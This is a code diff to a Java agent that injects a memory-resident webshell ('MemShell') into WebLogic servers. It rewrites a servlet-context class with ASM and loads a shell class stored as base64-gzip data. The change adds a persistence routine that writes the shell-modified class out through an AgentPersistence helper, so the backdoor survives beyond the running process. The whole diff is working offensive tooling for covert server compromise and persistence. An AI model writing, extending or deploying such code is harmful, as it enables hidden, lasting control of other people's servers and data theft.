@@ -1,9 +1,11 @@
 package com.reajason.javaweb.memshell.injector.weblogic;
 
+import com.reajason.javaweb.agent.AgentPersistence;
 import org.objectweb.asm.*;
 
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
+import java.io.File;
 import java.lang.instrument.ClassFileTransformer;
 import java.lang.instrument.Instrumentation;
 import java.security.ProtectionDomain;
@@ -26,22 +28,35 @@ public class WebLogicServletContextAgentInjector implements ClassFileTransformer
     }
 
     public static void premain(String args, Instrumentation inst) throws Exception {
-        launch(inst);
+        launch(args, inst);
     }
 
     public static void agentmain(String args, Instrumentation inst) throws Exception {
-        launch(inst);
+        launch(args, inst);
     }
 
-    private static void launch(Instrumentation inst) throws Exception {
+    private static void launch(String args, Instrumentation inst) throws Exception {
         System.out.println("MemShell Agent is starting");
+        boolean persist = isPersistent(args);
+        boolean targetFound = false;
         inst.addTransformer(new WebLogicServletContextAgentInjector(), true);
         for (Class<?> allLoadedClass : inst.getAllLoadedClasses()) {
             String name = allLoadedClass.getName();
             if (TARGET_CLASS.replace("/", ".").equals(name)) {
+                targetFound = true;
                 inst.retransformClasses(allLoadedClass);
+                if (persist) {
+                    persist(allLoadedClass);
+                }
             }
         }
+        if (persist && !targetFound) {
+            throw new IllegalStateException("Cannot persist before the WebLogic servlet context class is loaded");
+        }
+    }
+
+    static boolean isPersistent(String args) {
+        return AgentPersistence.isPersistent(args);
     }
 
     @Override
@@ -51,17 +66,9 @@ public class WebLogicServletContextAgentInjector implements ClassFileTransformer
         if (TARGET_CLASS.equals(className)) {
             defineTargetClass(loader);
             try {
-                ClassReader cr = new ClassReader(bytes);
-                ClassWriter cw = new ClassWriter(cr, ClassWriter.COMPUTE_MAXS | ClassWriter.COMPUTE_FRAMES) {
-                    @Override
-                    protected ClassLoader getClassLoader() {
-                        return loader;
-                    }
-                };
-                ClassVisitor cv = getClassVisitor(cw);
-                cr.accept(cv, ClassReader.EXPAND_FRAMES);
+                byte[] transformedBytes = transformClass(loader, bytes, getClassName());
                 System.out.println("MemShell Agent is working at " + TARGET_CLASS.replace("/", ".") + "." + TARGET_METHOD_NAME);
-                return cw.toByteArray();
+                return transformedBytes;
             } catch (Exception e) {
                 e.printStackTrace();
             }
@@ -69,8 +76,25 @@ public class WebLogicServletContextAgentInjector implements ClassFileTransformer
         return bytes;
     }
 
+    private static byte[] transformClass(final ClassLoader loader, byte[] bytes, String shellClassName) {
+        ClassReader cr = new ClassReader(bytes);
+        ClassWriter cw = new ClassWriter(cr, ClassWriter.COMPUTE_MAXS | ClassWriter.COMPUTE_FRAMES) {
+            @Override
+            protected ClassLoader getClassLoader() {
+                return loader;
+            }
+        };
+        ClassVisitor cv = getClassVisitor(cw, shellClassName);
+        cr.accept(cv, ClassReader.EXPAND_FRAMES);
+        return cw.toByteArray();
+    }
+
     @SuppressWarnings("all")
     public static ClassVisitor getClassVisitor(ClassVisitor cv) {
+        return getClassVisitor(cv, getClassName());
+    }
+
+    private static ClassVisitor getClassVisitor(ClassVisitor cv, final String shellClassName) {
         return new ClassVisitor(Opcodes.ASM9, cv) {
             @Override
             public MethodVisitor visitMethod(int access, String name, String descriptor,
@@ -79,7 +103,7 @@ public class WebLogicServletContextAgentInjector implements ClassFileTransformer
                 if (TARGET_METHOD_NAME.equals(name)) {
                     try {
                         Type[] argumentTypes = Type.getArgumentTypes(descriptor);
-                        return new AgentShellMethodVisitor(mv, argumentTypes, getClassName());
+                        return new AgentShellMethodVisitor(mv, argumentTypes, shellClassName);
                     } catch (Exception e) {
                         e.printStackTrace();
                     }
@@ -211,6 +235,19 @@ public class WebLogicServletContextAgentInjector implements ClassFileTransformer
             }
             mv.visitMethodInsn(Opcodes.INVOKESTATIC, owner, "valueOf", descriptor, false);
         }
+    }
+
+    static File persist(Class<?> targetClass) throws Exception {
+        return persist(targetClass, getClassName(), gzipDecompress(decodeBase64(getBase64String())));
+    }
+
+    static File persist(Class<?> targetClass, final String shellClassName, byte[] shellClassBytes) throws Exception {
+        return AgentPersistence.persist(targetClass, shellClassName, shellClassBytes, new AgentPersistence.Transformer() {
+            @Override
+            public byte[] transform(ClassLoader loader, byte[] classBytes) {
+                return transformClass(loader, classBytes, shellClassName);
+            }
+        });
     }
 
     @SuppressWarnings("all")
